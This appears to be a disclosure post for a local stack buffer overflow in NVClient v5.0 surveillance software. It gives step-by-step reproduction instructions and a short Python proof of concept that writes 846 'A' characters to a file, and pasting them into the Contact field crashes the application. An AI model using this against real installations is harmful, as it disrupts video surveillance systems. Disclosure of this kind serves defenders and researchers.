---
layout: post
title: NVClient v5.0 - Stack Buffer Overflow (DoS)
date: 2024-05-25
category: exploit
---

# Exploit Title: NVClient v5.0 - Stack Buffer Overflow (DoS)
# Discovered by: Ahmet Ümit BAYRAM
# Discovered Date: 2023-08-19
# Software Link: http://www.neonguvenlik.com/yuklemeler/yazilim/kst-f919-hd2004.rar
# Software Manual: http://download.eyemaxdvr.com/DVST%20ST%20SERIES/CMS/Video%20Surveillance%20Management%20Software(V5.0).pdf
# Vulnerability Type: Buffer Overflow Local
# Tested On: Windows 10 64bit
# Tested Version: 5.0


# Steps to Reproduce:
# 1- Run the python script and create exploit.txt file
# 2- Open the application and log in
# 3- Click the "Config" button in the upper menu
# 4- Click the "User" button just below it
# 5- Now click the "Add users" button in the lower left
# 6- Fill in the Username, Password, and Confirm boxes
# 7- Paste the characters from exploit.txt into the Contact box
# 8- Click OK and crash!



#!/usr/bin/env python3

exploit = 'A' * 846

try:
    with open("exploit.txt","w") as file:
        file.write(exploit)
    print("POC is created")
except:
    print("POC not created")